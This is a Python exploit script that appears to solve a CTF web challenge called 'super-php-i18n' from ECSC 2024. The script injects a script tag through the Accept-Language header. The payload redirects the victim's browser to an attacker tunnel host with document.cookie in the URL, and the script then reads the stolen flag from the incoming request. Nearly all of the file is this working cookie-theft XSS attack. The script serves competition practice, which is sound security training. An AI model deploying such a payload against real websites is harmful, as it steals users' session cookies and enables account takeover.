#!/usr/bin/env python3

import requests
import tunnel
import logging
import os
import re

logging.disable()

# For HTTP connection
URL = os.environ.get("URL", "http://super-php-i18n.challs.external.open.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]

with tunnel.open_http_tunnel() as t:
    res = requests.post(URL, data={
        "name": "name",
        "email": "email",
        "message": "message",
        "pow": "aa7b16e224d385f1a8984d69"
    }, headers={
        "Accept-Language": f'<script>document.location="http://{t.remote_host}:{t.remote_port}?c="+document.cookie</script>'
    })

    _, path, _, _ = t.wait_request()
    t.send_response(200, {}, b'Hello world')
    print(re.findall(r'CCIT\{.*\}', path)[0])
